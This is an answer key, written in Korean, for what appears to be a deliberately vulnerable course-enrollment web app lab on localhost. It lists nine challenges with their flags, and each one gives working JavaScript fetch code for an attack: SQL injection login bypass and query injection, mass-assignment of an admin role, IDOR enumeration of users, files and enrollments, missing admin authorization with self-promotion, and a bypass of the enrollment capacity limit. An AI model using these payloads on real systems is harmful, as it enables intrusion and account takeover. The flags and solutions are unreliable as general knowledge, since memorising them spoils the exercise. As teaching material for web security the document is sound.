# 정답지 (Answer Key)

> ⚠️ 실습을 먼저 직접 시도해보세요. 이 문서는 힌트로도 해결이 안 될 때 참고하세요.

---

## #1 SQLi 로그인 우회 `FLAG{sqli_login_bypass_admin}`

**공격 방법:** 로그인 UI에서 username 필드에 직접 입력

```
username: admin' --
password: (아무 값이나)
```

또는 콘솔에서:

```javascript
const res = await fetch('http://localhost:4000/api/auth/login', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({ username: "admin' --", password: "anything" })
});
console.log(await res.json());
// _debug_trace.flag 확인
```

**원리:** `--` 이후가 SQL 주석 처리되어 password 조건이 무시됩니다.

---

## #2 회원가입 admin role 주입 `FLAG{mass_assign_register_admin}`

**공격 방법:** 콘솔에서 API 직접 호출 (UI는 role 필드 입력 불가)

```javascript
const res = await fetch('http://localhost:4000/api/auth/register', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({
    username: '테스터',
    password: 'test1234',
    role: 'admin'          // ← 공식 문서에 없는 필드
  })
});
console.log(await res.json());
// _debug_trace.flag 확인
```

**원리:** 백엔드가 요청 body 필드를 검증 없이 그대로 DB에 저장합니다.

---

## #3 IDOR 사용자 정보 노출 `FLAG{idor_user_pw_hash_leak}`

**공격 방법:** 로그인 후 다른 userId로 사용자 정보 조회

```javascript
const token = localStorage.getItem('accessToken');

// userId를 1, 2, 3 등으로 바꿔가며 호출
const res = await fetch('http://localhost:4000/api/users/1', {
  headers: { 'Authorization': `Bearer ${token}` }
});
console.log(await res.json());
// passwordHash 및 _debug_trace.flag 확인
```

**원리:** 요청자의 userId와 경로의 userId가 일치하는지 검사하지 않습니다.

---

## #4 BFLA 관리자 대시보드 무단 접근 `FLAG{bfla_admin_no_auth_guard}`

**공격 방법:** 인증 없이 또는 일반 계정 토큰으로 관리자 API 호출

```javascript
// 인증 없이 호출
const res = await fetch('/api/admin');
console.log(await res.json());
// _debug_trace.flag 확인
```

또는 프론트엔드에서 `/admin` 페이지로 직접 접속합니다.

**원리:** 관리자 엔드포인트에 NestJS Guard가 적용되어 있지 않습니다.

---

## #5 SQLi 숨김 강의 열람 `FLAG{sqli_hidden_courses_revealed}`

**공격 방법:** category 파라미터에 SQL 주입

```javascript
const payload = encodeURIComponent("' OR c.is_visible=false OR '1'='1");
const res = await fetch(`/api/courses?category=${payload}`);
const data = await res.json();
console.log(data);
// 숨김 강의(is_visible=false) 포함 여부 및 _debug_trace.flag 확인
```

**원리:** category 값이 WHERE 절에 직접 삽입되어 is_visible 조건이 우회됩니다.

---

## #6 IDOR 파일 경로 노출 `FLAG{idor_file_stored_path_leak}`

**공격 방법:** 미수강 또는 숨김 강의의 courseId로 파일 목록 API 호출

```javascript
const token = localStorage.getItem('accessToken');

// courseId를 1, 2, 3 등으로 바꿔가며 호출
const res = await fetch('http://localhost:4000/api/courses/5/files', {
  headers: { 'Authorization': `Bearer ${token}` }
});
console.log(await res.json());
// storedPath 및 _debug_trace.flag 확인
```

숨김 강의의 courseId는 #5 SQLi로 먼저 확인하거나, 순차적으로 ID를 시도합니다.

**원리:** 수강 여부 및 강의 공개 상태를 확인하지 않습니다.

---

## #7 정원 초과 수강신청 `FLAG{biz_logic_capacity_bypass}`

**공격 방법:** UI의 비활성화 버튼을 무시하고 수강신청 API 직접 호출

```javascript
const token = localStorage.getItem('accessToken');

// 정원이 꽉 찬 강의 ID 확인 후 직접 수강신청
const res = await fetch('http://localhost:4000/api/enrollments', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'Authorization': `Bearer ${token}`
  },
  body: JSON.stringify({ courseId: 3 })  // 정원 초과 강의 ID
});
console.log(await res.json());
// _debug_trace.flag 확인
```

정원이 초과된 강의는 강의 목록 UI에서 "수강신청" 버튼이 비활성화된 강의를 확인합니다.

**원리:** 백엔드가 정원 초과 여부를 재검증하지 않습니다.

---

## #8 IDOR 타인 수강 취소 `FLAG{idor_enroll_cancel_hijack}`

**공격 방법:** 타인의 enrollment ID로 수강 취소 API 호출

```javascript
const token = localStorage.getItem('accessToken');

// enrollment ID를 1, 2, 3 등으로 바꿔가며 호출
const res = await fetch('http://localhost:4000/api/enrollments/1/cancel', {
  method: 'POST',
  headers: { 'Authorization': `Bearer ${token}` }
});
console.log(await res.json());
// _debug_trace.flag 확인
```

enrollment ID는 수강신청 목록 API(`GET /api/enrollments`)로 확인하거나 순차적으로 시도합니다.

**원리:** 취소 요청 시 해당 enrollment의 소유자 검사가 없습니다.

---

## #9 BFLA 자기 권한 상승 `FLAG{bfla_self_promote_to_admin}`

**공격 방법:** 일반(student) 계정으로 로그인 후 본인의 role을 admin으로 변경

```javascript
// 1. student 계정으로 로그인
const loginRes = await fetch('http://localhost:4000/api/auth/login', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({ username: 'student1', password: 'password123' })
});
const { accessToken, id: userId } = await loginRes.json();

// 2. 본인 userId로 role을 admin으로 변경
const res = await fetch(`http://localhost:4000/api/admin/users/${userId}/role`, {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'Authorization': `Bearer ${accessToken}`
  },
  body: JSON.stringify({ role: 'admin' })
});
console.log(await res.json());
// _debug_trace.flag 확인
```

**원리:** 관리자 전용 API에 실제 권한 검사 미들웨어가 없습니다.
